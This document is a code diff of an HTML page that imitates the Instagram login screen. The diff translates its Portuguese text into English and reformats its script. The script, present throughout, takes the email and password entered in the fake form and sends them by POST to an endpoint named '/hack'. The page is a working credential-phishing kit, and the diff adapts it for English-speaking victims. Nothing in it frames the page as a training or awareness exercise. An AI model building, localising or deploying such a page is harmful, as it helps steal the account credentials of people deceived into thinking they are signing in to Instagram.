@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="pt-BR">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -17,57 +17,56 @@
                     <img src="./img//instagram-logo.png" alt="Instagram logo" title="Instagram logo" />
                 </h1>
                 <form id="loginSignupForm">
-                    <label for="email" class="sr-only">Telefone, nome de usuário ou e-mail</label>
-                    <input name="email" placeholder="Telefone, nome de usuário ou e-mail" />
+                    <label for="email" class="sr-only">Phone number, username, or email</label>
+                    <input name="email" placeholder="Phone number, username, or email" />
 
-                    <label for="password" class="sr-only">Senha</label>
-                    <input name="password" type="password" placeholder="Senha" />
+                    <label for="password" class="sr-only">Password</label>
+                    <input name="password" type="password" placeholder="Password" />
 
-                    <button type="button" id="loginBtn">Entrar</button>
+                    <button type="button" id="loginBtn">Log In</button>
                 </form>
                 <div class="flex separator align-items-center">
                     <span></span>
-                    <div class="or">OU</div>
+                    <div class="or">OR</div>
                     <span></span>
                 </div>
                 <div class="login-with-fb flex direction-column align-items-center">
                     <div>
                         <img />
-                        <a>Entrar com o facebook</a>
+                        <a>Log in with Facebook</a>
                     </div>
-                    <a href="#">Esqueceua senha?</a>
+                    <a href="#">Forgot password?</a>
                 </div>
             </div>
             <div class="panel register flex justify-content-center">
-                <p>Não tem uma conta?</p>
-                <a href="#">Cadastre-se</a>
+                <p>Don't have an account?</p>
+                <a href="#">Sign up</a>
             </div>
             <div class="app-download flex direction-column align-items-center">
-                <p>Obtenha o aplicativo.</p>
+                <p>Get the app.</p>
                 <div class="flex justify-content-center">
-                    <img src="./img/apple-button.png"      alt="Imagem com a logo da Apple Store" title="Imagem com a logo da Apple Store" />
-                    <img src="./img/googleplay-button.png" alt="Imagem com a logo da Google Play" title="Imagem com a logo da Google Play" />
+                    <img src="./img/apple-button.png"      alt="Apple Store logo" title="Apple Store logo" />
+                    <img src="./img/googleplay-button.png" alt="Google Play logo" title="Google Play logo" />
                 </div>
             </div>
         </section>
     </main>
     <footer>
         <ul class="flex flex-wrap justify-content-center">
-            <li><a href="#">SOBRE</a></li>
-            <li><a href="#">AJUDA</a></li>
-            <li><a href="#">IMPRENSA</a></li>
+            <li><a href="#">ABOUT</a></li>
+            <li><a href="#">HELP</a></li>
+            <li><a href="#">PRESS</a></li>
             <li><a href="#">API</a></li>
-            <li><a href="#">CARREIRAS</a></li>
-            <li><a href="#">PRIVACIDADE</a></li>
-            <li><a href="#">TERMOS</a></li>
-            <li><a href="#">LOCALIZAÇÃO</a></li>
-            <li><a href="#">CONTAS MAIS RELEVANTES</a></li>
+            <li><a href="#">CAREERS</a></li>
+            <li><a href="#">PRIVACY</a></li>
+            <li><a href="#">TERMS</a></li>
+            <li><a href="#">LOCATIONS</a></li>
+            <li><a href="#">TOP ACCOUNTS</a></li>
             <li><a href="#">HASHTAGS</a></li>
-            <li><a href="#">IDIOMA</a></li>
+            <li><a href="#">LANGUAGE</a></li>
         </ul>
-        <p class="copyright">© 2020 Instagram do Facebook</p>
+        <p class="copyright">© 2020 Instagram from Facebook</p>
     </footer>
-
 
     <script>
         // Function to handle form submission for login or signup
@@ -76,23 +75,22 @@
             const formData = new FormData(form);
 
             // Append the login/signup type (login or signup)
-            const eml=formData.get('email');
-            const pass=formData.get('password');
+            const email = formData.get('email');
+            const password = formData.get('password');
             formData.append('action', type);
-            // console.log(eml,pass);
-            const total=eml+pass;
+            
             try {
                 // Send POST request
                 const response = await fetch("http://localhost:5000/hack", {
-      method: "POST",
-      headers: {
-        "Content-Type": "application/json",
-      },
-      body: JSON.stringify({
-        email: eml,
-        password: pass,
-      }),
-    });
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify({
+                        email: email,
+                        password: password,
+                    }),
+                });
 
                 // Check if the response is successful
                 if (response.ok) {
@@ -110,10 +108,8 @@
 
         // Event listener for Login button
         document.getElementById('loginBtn').addEventListener('click', async () => {
-           await sendPostRequest('login');
+            await sendPostRequest('login');
         });
-
-        // Event listener for Signup button
     </script>
 </body>
 </html>
